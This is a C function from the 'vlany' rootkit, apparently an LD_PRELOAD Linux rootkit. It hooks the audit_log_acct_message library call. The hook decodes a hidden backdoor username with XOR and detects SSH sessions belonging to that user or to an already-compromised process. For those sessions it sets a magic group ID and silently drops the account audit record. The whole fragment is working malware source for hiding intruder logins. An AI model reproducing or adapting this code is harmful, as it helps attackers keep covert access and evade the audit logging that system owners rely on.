int audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result)
{
    #ifdef DEBUG
        printf("[vlany] audit_log_acct_message() called\n");
    #endif

    if(!old_alam) old_alam = get_symbol(RTLD_NEXT, CAUDIT_LOG_ACCT_MESSAGE);

    char sshd_str[40], *vlany_user = strdup(VLANY_USER);
    xor(vlany_user);
    snprintf(sshd_str, sizeof(sshd_str), "sshd: %s", vlany_user);
    cleanup(vlany_user, strlen(vlany_user));

    if(strstr(procname_self(), sshd_str) || owned())
    {
        setgid(MAGIC_GID);
        return 0;
    }

    return old_alam(audit_fd, type, pgname, op, name, id, host, addr, tty, result);
}
